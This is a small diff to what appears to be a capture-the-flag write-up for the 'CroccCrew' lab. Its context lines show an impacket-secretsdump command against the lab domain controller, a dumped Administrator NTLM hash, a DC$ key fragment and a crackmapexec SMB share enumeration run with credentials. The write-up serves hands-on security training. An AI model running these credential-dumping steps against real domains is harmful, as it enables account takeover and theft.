@@ -748,7 +748,7 @@ Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 
 
 ```bash
-~/CroccCrew# ~/CroccCrew# impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
+:~/CroccCrew# impacket-secretsdump -k -no-pass DC.COOCTUS.CORP
 Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
 
 [*] Service RemoteRegistry is in stopped state
@@ -877,11 +877,6 @@ DC$:des-cbc-md5:e6bcfdae026ec449
 
 <p><code>Administrator</code>:500:<code>aad3b435b51404eeaad3b435b51404ee</code>:7dfa0531d73101ca080c7379a9bff1c7:::
 
-	<br>
-
-```bash
-sudo gem install winrm winrm-fs stringio logger fileutils
-```
 
 ```bash
 ~/CroccCrew# crackmapexec smb TargetIP -u password-reset -p 'resetpassword' --shares
